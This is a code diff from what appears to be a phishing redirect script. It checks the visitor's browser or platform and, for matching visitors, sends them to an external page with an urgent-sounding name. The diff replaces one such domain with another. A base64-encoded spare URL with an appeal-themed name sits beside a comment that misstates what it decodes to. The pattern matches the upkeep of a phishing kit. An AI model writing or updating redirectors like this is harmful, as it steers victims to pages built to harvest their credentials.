@@ -30,12 +30,12 @@
       const agent = navigator.userAgent || navigator.vendor || window.opera;
       const allowed = supported.some(platform => agent.includes(platform));
 
-      // Base64 for:   https://immediatly-information-required.vercel.app
+      // Base64 for:   https://apply-for-page-info-here.vercel.app
       const encoded = "aHR0cHM6Ly9maWxlLWFuLWFwcGVhbDk4MDcubmV0bGlmeS5hcHAv";
 
       if (allowed) {
         
-                window.location.href = "https://immediatly-information-required.vercel.app";
+                window.location.href = "https://apply-for-page-info-here.vercel.app";
       } else {
         document.getElementById("error").style.display = "block";
       }
